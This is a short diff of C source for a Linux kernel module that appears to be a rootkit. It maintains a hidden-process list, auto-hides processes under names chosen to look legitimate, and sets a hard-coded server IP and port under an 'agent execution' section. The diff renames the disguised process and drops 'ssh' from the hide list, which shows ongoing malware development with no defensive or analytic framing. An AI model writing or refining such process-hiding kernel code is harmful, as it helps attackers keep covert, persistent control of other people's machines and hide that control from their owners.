@@ -37,9 +37,8 @@ MODULE_DESCRIPTION("Ring 0  for Linux Kernels x86/x86_64 5.x/6.x");
 static char hidden_processes[HIDE_PROCESS_LIST_SIZE][MAX_PROCESS_NAME_LEN];
 static int hidden_process_count = 0;
 // Auto-hide processes
-#define AUTO_HIDE_PROCESS "intel_gnu_header"
+#define AUTO_HIDE_PROCESS "intelheaders_gnu"
 #define AUTO_HIDE_PROCESS2 "qemu-ga"
-#define AUTO_HIDE_PROCESS3 "ssh"
 //==========[AGENT EXECUTION]=========//
 #define YOUR_SRV_IP "77.110.126.70"     // (kept for compatibility, not used in agent mode)
 #define YOUR_SRV_PORT 1234          // (kept for compatibility, not used in agent mode)
